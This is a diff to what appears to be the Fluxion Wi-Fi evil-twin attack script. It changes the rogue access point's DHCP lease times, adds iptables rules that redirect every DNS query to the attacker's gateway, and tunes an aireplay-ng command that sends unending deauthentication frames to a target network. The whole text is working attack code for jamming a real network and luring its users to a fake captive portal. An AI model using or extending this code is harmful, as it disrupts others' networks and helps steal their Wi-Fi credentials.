@@ -693,8 +693,8 @@ captive_portal_set_attack() {
   echo "\
 authoritative;
 
-default-lease-time 600;
-max-lease-time 7200;
+default-lease-time 10;
+max-lease-time 30;
 
 subnet $CaptivePortalGatewayNetwork.0 netmask 255.255.255.0 {
     option broadcast-address $CaptivePortalGatewayNetwork.255;
@@ -1211,6 +1211,10 @@ captive_portal_set_routes() {
     --to-destination $CaptivePortalGatewayAddress:80
   iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
     --to-destination $CaptivePortalGatewayAddress:443
+  iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \
+    --to-destination $CaptivePortalGatewayAddress:53
+  iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT \
+    --to-destination $CaptivePortalGatewayAddress:53
   iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
@@ -1453,7 +1457,7 @@ captive_portal_start_jammer_service() {
   elif [[ $option_deauth -eq 2 ]]; then
     fluxion_window_open CaptivePortalJammerServiceXtermPID \
       "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-      "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
+      "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one -D $CaptivePortalJammerInterface"
   fi
 }
 
